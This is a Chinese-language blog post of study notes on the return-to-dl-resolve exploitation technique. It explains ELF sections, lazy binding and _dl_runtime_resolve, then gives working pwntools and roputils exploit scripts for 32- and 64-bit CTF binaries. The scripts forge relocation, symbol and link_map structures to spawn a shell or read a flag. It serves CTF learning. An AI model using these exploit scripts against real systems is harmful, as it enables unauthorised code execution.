---
layout: post
title: return to dl-resolve学习
---



## 文件结构

*程序源代码:*

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vuln()
{
	char buf[0x88];
	read(0, buf, 256);
}

int main()
{
	vuln();
	write(1, "vuln has been exec \n", 20);
	return 0;
}
```

*编译:*

`gcc -o ret_to_dl_resolve -m32 -fno-stack-protector r.c`

*用readelf查看*

```bash
-> readelf -S ret_to_dl_resolve
There are 30 section headers, starting at offset 0x1754:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  23  4
  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048340 000340 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        08048504 000504 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048518 000518 00001d 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048538 000538 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048574 000574 000100 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f0c 000f0c 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f10 000f10 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 00001a 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00103c 000420 10     28  45  4
  [28] .strtab           STRTAB          00000000 00145c 0001f3 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00164f 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

> 1. 显示的30个段各属性来自ELF文件尾部的段表, 它是一个名为Elf32_Shdr的结构体的数组
> 2. `objdump -h ret_to_dl_resolve` 也会显示各个段信息. 并且objdump输出会不显示某些辅助段的信息



*主要段含义:*

- .interp 段保存一个字符串, 指明ELF所需动态链接器的路径


- .data段 保存**已经初始化的全局变量和局部静态变量**
- .rodata段 保存**只读数据**, 段属性通常也为只读
- .bss段 保存**未初始化的全局变量和局部静态变量**
- .comment段 存放**编译器版本信息**; .strtab字符串表; .symtab 符号表; .shstrtab段名表
- .init , .fini **程序的初始化与终结代码段**
- .got 全局偏移表, **每一个外部定义的符号都有相应的条目**
- .plt 过程链接表, 如果符号是函数, 在plt表也有相应的条目, 且一个plt条目对应一个got条目
- .rel.dyn 用于变量重定位, .rel.plt 用于**函数重定位**
- .dynstr 包含了**动态链接的字符串**; .strtab是**符号字符串表**



>.symtab和 .dynsym都是符号表,有什么区别呢?
>
>.symtab 保存了所有符号, 包括.dynsym中的符号
>
>.dynsym只保存与动态链接相关的符号,对于那些模块内部的符号不保存. 也就是只保存运行时所需的条目
>
>strip就是用来移除某些non-allocable sections的.
>
>所以.dynsym是 .symtab的一个子集





>.dynamic段
>
>这个段里保存了动态链接器所需要的基本信息, 比如依赖于那些共享对象, 动态连接符号表的位置, 动态链接重定位表的位置 , readelf -d选项查看.. ldd查看动态链接器依赖.



## 延迟绑定

_准备:_

- 延迟绑定的基本思想是当函数第一次被用到的时候才进行绑定

- 当用到一个外部函数的时候, 需要知道这个外部函数的所在模块的ID与模块内ID, 由一个lookup函数(实际叫`_dl_runtime_resolve()`)进行查找绑定.

- 并不直接通过got表进行跳转, 而加入一个叫PLT的结构进行跳转, 每个外部函数在PLT都有相应的项

- ELF将got表拆分为 .got 和 .got.plt 两个表, .got用来保存全局变量引用的地址, .got.plt用来保存函数引用的地址

- .got.plt表 前三项分别是如下所示是特殊的.  其余项分别对应每个外部函数的引用

  - .dynamic 段的地址
  - 本模块的 ID
  - `_dl_runtime_resolve()`的地址

- .plt 的基本结构如下:

  ```
  <.plt>:
  	push *(got+4)
  	jmp *(got+8)
  	...

  <read@plt>:
  	jmp    *(read@got)
   	push   n
   	jmp    PLT0
  ```



_运行流程:_

1. `call   8048300 <read@plt>` 
2. `jmp    *(read@got)`
3. read@got 的值是`0x08048306`, 也就是说又跳转到`read@plt`的`push n`这条指令, n代表这个外部函数在.rel.plt的下标
4. `jmp PLT0` 
5. `push 本模块ID`
6. `jmp _dl_runtime_resolve ` 



## _dl_runtime_resolve函数

_准备:_

- .rel.plt 用于对函数的重定位`read -r`查看. 条目对应结构体

  ```c
  typedef uint32_t Elf32_Addr;
  typedef uint32_t Elf32_Word;
  typedef struct
  {
    Elf32_Addr    r_offset;               /* Address */
    Elf32_Word    r_info;                 /* Relocation type and symbol index */
  } Elf32_Rel;
  ```

- `r_offset` 即为 该函数在 .got.plt 中的地址, `r_info`则保存的是其类型和符号序号

- `r_info`的常见值为`00000107` , `00000307`等, `01`代表**symbol index** 是1, `07`代表重定位入口类型为`R_386_JUMP_SLOT`

- `symbol index`含义是此函数在 .dynsym段的索引.  .dynsym的条目对应数据结构为

  ```c
  typedef struct
  {
    Elf32_Word    st_name;   /* Symbol name (string tbl index) */
    Elf32_Addr    st_value;  /* Symbol value */
    Elf32_Word    st_size;   /* Symbol size */
    unsigned char st_info;   /* Symbol type and binding */
    unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
    Elf32_Section st_shndx;  /* Section index */
  } Elf32_Sym;
  ```

  ​

_函数流程_:

- 开始执行 `_dl_runtime_resolve( link_map,  rel_offset);`  # `_dl_runtime_resolve( link_map,  0)`
- 首先找到在.rel.plt 中此函数的条目 `addr = .rel.plt起始地址 + rel_offset`  # `addr = 0x80482b0 + 0`
- 提取出r_info字段, 根据r_info 在.dynsym找到对应条目 
  - `r_info = Elf32_Rel->r_info `  # `r_info = 000107 `
  - `addr = .dynsym起始地址 + sizeof(Elf32_Sym)*(r_info>>8)  `       # `addr = 080481cc + 16*1`
- security check
- 从dynsym段 也就是Elf32_Sym结构体中提取st_name字段, 并以此在.dynstr中找到函数名称
  - `st_name = Elf32_Sym->st_name `    # `st_name = 0x1a`
  - `addr = .dynstr起始地址 + st_name`  # `addr = 0x804822c + 0x1a` ("read")
- 根据函数名称在动态库中搜索, 找到函数地址后填充至.got.plt对应(r_offset)位置




![函数运行流程](http://o6uyyks1m.bkt.clouddn.com/2017-07-03-return-to-dl-resolve.png)








## Return to dl-resolve攻击

根据`_dl_runtime_resolve`函数的运行流程, 可以构造

```
1. 控制EIP为PLT[0]的地址，只需传递一个rel_offset参数
2. 控制rel_offset的大小，使relplt条目的位置落在可控地址内
3. 伪造relplt条目的内容，使dynsym落在可控地址内
4. 伪造dynsym的内容，使st_name可控
5. 伪造name为任意库函数，如system
```



_64位环境下 :_

思想一致, 区别就是:

- Elf64_Rela结构体的大小为0x18, 也就是relplt的一个条目是0x18字节
- 函数参数也变成寄存器传递
- 需要将 link_map + 0x1c8 地址处置 0



现成工具[roputils](https://github.com/inaz2/roputils)



## 实例



_x86 32位环境 :_

以XMAN-PWN 的level4为例, 写的脚本

```python
#coding:utf-8
from pwn import *

context.log_level = 'debug'
p = process('./level4')

offset = 0x8c
stack_size = 0x400
vulfun = 0x0804844b
bss_addr = 0x804a024
base_stage = bss_addr + stack_size

pppr = 0x8048509
p_ebp_r = 0x804850b
leave_r = 0x80483b8

elf = ELF('./level4')
write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']

def main():
    payload1 = 'A' * offset
    payload1 += p32(read_plt)
    payload1 += p32(pppr) + p32(0) + p32(base_stage) + p32(100)
    payload1 += p32(p_ebp_r) + p32(base_stage)
    payload1 += p32(leave_r)
    p.sendline(payload1)

    plt_0 = 0x8048300
    relplt_0 = 0x80482b0
    rel_offset = (base_stage + 0x30-0x8) - relplt_0
    dynsym_0 = 0x80481cc
    dynstr_0 = 0x804822c
    fake_dynsym_addr = base_stage + 0x30
    align = 0x10 - ((fake_dynsym_addr - dynsym_0) % 0x10)   #
    fake_dynsym_addr = fake_dynsym_addr +align              #
    r_index = (fake_dynsym_addr - dynsym_0) / 0x10          # ensure r_index is integer
    # print hex(fake_sym)
    r_info = (r_index << 8) | 0x7
    faked_relplt = p32(write_got) + p32(r_info)
    st_name = (fake_dynsym_addr + 16) - dynstr_0
    faked_dynsym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    payload2 = 'B' * 4
    payload2 += p32(plt_0) +p32(rel_offset)
    payload2 += 'C'*4 + p32(base_stage+80)
    payload2 += 'A'*(0x30-0x8-len(payload2)) + faked_relplt + 'b'*align
    payload2 += faked_dynsym
    payload2 += 'system\x00a'
    payload2 += '/bin/sh\x00'
    p.sendline(payload2)

    p.interactive()

if __name__ == '__main__':
    main()
```

使用工具 roputils :  (复制自官方[i386demo](https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py))

```python
#coding:utf-8
from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
```

- `Python2 file.py binary 0x88`
- 如果是远程地址, 只需要把`proc(rop.fpath)`改为`proc(host="xxx.com", port=8888)`



_x64 64位环境 :_ (同样修改自官方 [x86_64demo](https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-x86-64.py))

```python
from roputils import *

DEBUG = 1
fpath = sys.argv[1]
offset = 0x88
p4ret = 0x4006ac

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ["write", 1, rop.got()+8, 8],
    ["read", 0, addr_stage, 350]
, pivot=addr_stage)

if DEBUG:
    p = Proc(rop.fpath)
else:
    p = Proc(host='pwn2.jarvisoj.com', port=9883)

print p.read(7)             #######################  1
p.write(p64(len(buf))+buf)  #######################  2

# print "[+] read: %r" % p.read(len(buf)) 
addr_link_map = p.read_p64()
print 'addr_link_map %x' % addr_link_map
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    ["read", 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+310]               ############### 4
)

buf += rop.dl_resolve_call(addr_stage+210)    ############### 4
buf += rop.fill(210, buf)                     ############### 4
buf += rop.dl_resolve_data(addr_stage+210, 'system')   ############### 4
buf += rop.fill(310, buf)                     ############### 4
buf += rop.string('/bin/sh')
buf += rop.fill(330, buf)                   ############### 4

p.write(buf)
p.write_p64(0)
p.interact(0)
```



坑点:

- 标记1 `print p.read(7)` , 这是程序的欢迎信息, 没有用
- 标记2`p.write(p64(len(buf))+buf) `, 官方demo写的是p32, 正确是改为p64或者把`p64(len(buf))`删除
- 标记4, 官方demo提供的这6个数字在我这不能运行, 改的小一点, 注意一致(之前相等的改完也要相等)


_x64 64位环境 :_ 

roputils在64位使用有一个限制，需要泄露出来位于GOT表前面的link_map的地址，然后写入link_map_addr + 0x1c8 = 0，用来bypass。

今天(2018.4.5)看到有大佬伪造link_map来突破这个限制。

[链接1](http://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
[链接2](http://ddaa.tw/hitcon_pwn_200_blinkroot.html)


辅助函数：

```python
def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    '''
    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
    WARNING: fake_linkmap is 0x100 bytes length,be careful
    WARNING: two_offset = target - *(known_offset_addr)

    _dl_runtime_resolve(linkmap,reloc_arg)
    reloc_arg=0

    linkmap:
    0x00: START
    0x00: l_addr = two_offset
    0x08: fake_DT_JMPREL : 0
    0x10: fake_DT_JMPREL : p_fake_JMPREL
    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
    0x20: r_info
    0x28: append
    0x30: r_offset
    0x38: fake_DT_SYMTAB: 0
    0x40: fake_DT_SYMTAB: known_offset_addr-8
    0x48: /bin/sh(for system)
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
    0xf8: p_DT_JMPREL = fake_DT_JMPREL
    0x100: END
    '''
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0)
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='/bin/sh\x00'#for system offset 0x48
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)
```


[DEMO](http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/#pwn-xx-game)：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
    cn = process(['./dec.pwn','4091897675'],env={'LD_PRELOAD':'./libc.so'})
    bin = ELF('./dec.pwn')
    libc = ELF('./libc.so')
else:
    cn = remote('39.107.32.202',2333)
    bin = ELF('./dec.pwn')
    libc = ELF('./libc.so')

def z(a=''):
    gdb.attach(cn,a)
    if a == '':
        raw_input()

luckynum = [4091897675,4091897725,4091897731]

def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0)
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='flag\x00'#for open offset 0x48
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)

prdi=0x0000000000400da3
prsi_r15=0x0000000000400da1
buf = 0x602100
stage = 0x602400
prdx = 0x0000000000001b92# : pop rdx ; ret

#open
linkmap1,call1 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['open']-libc.sym['__libc_start_main'],stage)
#read
linkmap2,call2 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['read']-libc.sym['__libc_start_main'],stage+0x100)
#write
linkmap3,call3 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['write']-libc.sym['__libc_start_main'],stage+0x200)
#set rdx
linkmap4,call4 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],prdx-libc.sym['__libc_start_main'],stage+0x300)

pay = 'a'*0x148+p64(prdi)+p64(stage)+p64(bin.plt['gets']) #write linkmap
pay+=p64(prdi)+p64(stage+0x48)+p64(prsi_r15)+p64(0)+p64(0)+call1 #open
pay+=p64(prdi)+p64(3)+p64(prsi_r15)+p64(buf)+p64(0)+call2 # read
pay+=call4+p64(0x20) #set rdx
pay+=p64(prdi)+p64(1)+p64(prsi_r15)+p64(buf)+p64(0)+call3 #write
pay+=p64(0x400D36)
#z('b*0x0000000000400CE8\nb write\nb read\nc')
cn.sendline(pay)
sleep(0.1)
cn.sendline(linkmap1+linkmap2+linkmap3+linkmap4)

cn.interactive()
```


## 参考

[http://rk700.github.io/2015/08/09/return-to-dl-resolve/](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)

[http://www.inforsec.org/wp/?p=389](http://www.inforsec.org/wp/?p=389)

[http://fanrong1992.github.io/2016/11/09/Return-to-dl-resolve/](http://fanrong1992.github.io/2016/11/09/Return-to-dl-resolve/)

[http://blog.csdn.net/guiguzi5512407/article/details/52752914](http://blog.csdn.net/guiguzi5512407/article/details/52752914)

[http://phrack.org/issues/58/4.html#article](http://phrack.org/issues/58/4.html#article)